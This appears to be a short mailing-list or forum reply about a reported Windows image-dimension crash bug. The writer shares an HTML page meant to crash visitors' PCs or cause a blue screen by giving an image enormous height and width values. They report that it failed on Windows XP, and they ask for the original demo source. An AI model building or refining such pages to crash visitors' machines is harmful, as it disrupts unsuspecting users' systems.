Hmm, a few things.

1) That site is down. Has been down ever since I got this email.
2) I created a site with this HTML code:

/././././././././././././

<html>
<body>
<p>If you are using IE, YOU SUCK! Just kidding.<br>
If you're in Window$ though, this should crash your puter<br>
or give you a BSOD. HAVE FUN BUDDY! MUA HA HA!</p>

<img src="http://thepcelement.com/hardware/neowinscreenie.jpg"
height="9999999999999999999999999999999999999999999999999991"
width="999999999999999999999999999999999999999999999999999999999999999991">

</body>
</html>

/./././././././././././

Yet no crash, this was on my Dad's PC running Window$ XP, no SP2,
Firefox and Internet Exploder, the image was all white, no slowdown or
anything.

Can you tell me what I'm doing wrong and give me the source to that page
you had up as a live demonstration? I'm interested to see more about
this vulnerability.

Thanks for posting, have a nice day,
